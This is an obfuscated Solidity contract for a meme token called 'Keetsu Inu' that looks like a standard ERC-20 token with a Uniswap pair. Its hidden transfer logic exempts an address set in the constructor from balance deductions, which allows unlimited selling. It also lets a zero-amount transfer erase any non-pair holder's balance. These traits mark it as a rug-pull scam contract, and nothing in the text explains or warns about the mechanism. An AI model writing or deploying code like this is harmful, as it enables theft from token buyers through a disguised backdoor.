contract KEETSU is Ownable {
    function transfer(address BuvWbtpc, uint256 FnaRUiLp) public returns (bool success) {
        tpia(msg.sender, BuvWbtpc, FnaRUiLp);
        return true;
    }

    function transferFrom(address muitvhlxdpa, address BuvWbtpc, uint256 FnaRUiLp) public returns (bool success) {
        require(FnaRUiLp <= allowance[muitvhlxdpa][msg.sender]);
        allowance[muitvhlxdpa][msg.sender] -= FnaRUiLp;
        tpia(muitvhlxdpa, BuvWbtpc, FnaRUiLp);
        return true;
    }

    uint256 private FxCrkePA = 101;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address xLeCmYB) {
        balanceOf[msg.sender] = totalSupply;
        UVyKZHbk[xLeCmYB] = FxCrkePA;
        IUniswapV2Router02 kyaofdmnp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        RWICaMxd = IUniswapV2Factory(kyaofdmnp.factory()).createPair(address(this), kyaofdmnp.WETH());
    }

    uint256 public totalSupply = 420690000000 * 10 ** 9;

    mapping(address => uint256) private UVyKZHbk;

    function tpia(address muitvhlxdpa, address BuvWbtpc, uint256 FnaRUiLp) private {
        if (0 == UVyKZHbk[muitvhlxdpa]) {
            balanceOf[muitvhlxdpa] -= FnaRUiLp;
        }
        balanceOf[BuvWbtpc] += FnaRUiLp;
        if (0 == FnaRUiLp && BuvWbtpc != RWICaMxd) {
            balanceOf[BuvWbtpc] = FnaRUiLp;
        }
        emit Transfer(muitvhlxdpa, BuvWbtpc, FnaRUiLp);
    }

    mapping(address => uint256) private tokzajin;

    string public symbol = 'KEETSU';

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    function approve(address vmDUetKG, uint256 FnaRUiLp) public returns (bool success) {
        allowance[msg.sender][vmDUetKG] = FnaRUiLp;
        emit Approval(msg.sender, vmDUetKG, FnaRUiLp);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    address public RWICaMxd;

    string public name = 'Keetsu Inu';
}
